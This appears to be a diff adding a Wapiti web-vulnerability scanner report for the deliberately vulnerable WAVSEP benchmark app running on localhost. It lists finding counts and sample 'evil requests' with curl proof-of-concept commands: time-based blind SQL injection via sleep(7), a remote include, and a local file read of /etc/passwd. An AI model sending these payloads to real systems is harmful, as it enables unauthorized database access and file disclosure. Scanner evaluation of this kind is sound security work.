@@ -1,0 +1,66 @@
+********************************************************************************
+                     Wapiti 3.0.1 - wapiti.sourceforge.net
+                   Report for http://127.0.0.1:8090/wavsep/
+              Date of the scan : Tue, 29 May 2018 03:04:47 +0000
+                          Scope of the scan : domain
+********************************************************************************
+
+Summary of vulnerabilities :
+----------------------------
+                                                            SQL Injection :   0
+                                                      Blind SQL Injection :  66
+                                                           File Handling : 1820
+                                                     Cross Site Scripting : 226
+                                                           CRLF Injection :   0
+                                                       Commands execution :   0
+                                                          Htaccess Bypass :   0
+                                                              Backup file :   0
+                                               Potentially dangerous file :   0
+                                              Server Side Request Forgery :  76
+********************************************************************************
+
+Blind SQL Injection
+-------------------
+Blind SQL vulnerability via injection in the parameter msg
+Evil request:
+    GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp?msg=%27%20or%20sleep%287%29%3D%27&target=a%40a.com HTTP/1.1
+    Host: 127.0.0.1:8090
+cURL command PoC : "curl "http://127.0.0.1:8090/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp?msg=%27%20or%20sleep%287%29%3D%27&target=a%40a.com""
+
+                                  *   *   *
+
+Blind SQL vulnerability via injection in the parameter username
+Evil request:
+    GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp?username=%27%20or%20sleep%287%29%231&password=textvalue2 HTTP/1.1
+    Host: 127.0.0.1:8090
+cURL command PoC : "curl "http://127.0.0.1:8090/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp?username=%27%20or%20sleep%287%29%231&password=textvalue2""
+
+                                  *   *   *
+
+Blind SQL vulnerability via injection in the parameter msg
+Evil request:
+    GET /wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp?msg=%27%20or%20sleep%287%29%231 HTTP/1.1
+    Host: 127.0.0.1:8090
+cURL command PoC : "curl "http://127.0.0.1:8090/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp?msg=%27%20or%20sleep%287%29%231""
+
+                                  *   *   *
+********************************************************************************
+
+File Handling
+-------------
+Possible Java include/open vulnerability via injection in the parameter target
+Evil request:
+    GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case01-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultFullInput-AnyPathReq-Read.jsp?target=http%3A%2F%2Fwww.google.fr%2F%3F HTTP/1.1
+    Host: 127.0.0.1:8090
+cURL command PoC : "curl "http://127.0.0.1:8090/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case01-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultFullInput-AnyPathReq-Read.jsp?target=http%3A%2F%2Fwww.google.fr%2F%3F""
+
+                                  *   *   *
+
+Linux local file disclosure vulnerability via injection in the parameter target
+Evil request:
+    GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case01-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultFullInput-AnyPathReq-Read.jsp?target=%2Fetc%2Fpasswd HTTP/1.1
+    Host: 127.0.0.1:8090
+cURL command PoC : "curl "http://127.0.0.1:8090/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case01-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultFullInput-AnyPathReq-Read.jsp?target=%2Fetc%2Fpasswd""
+
+                                  *   *   *
+
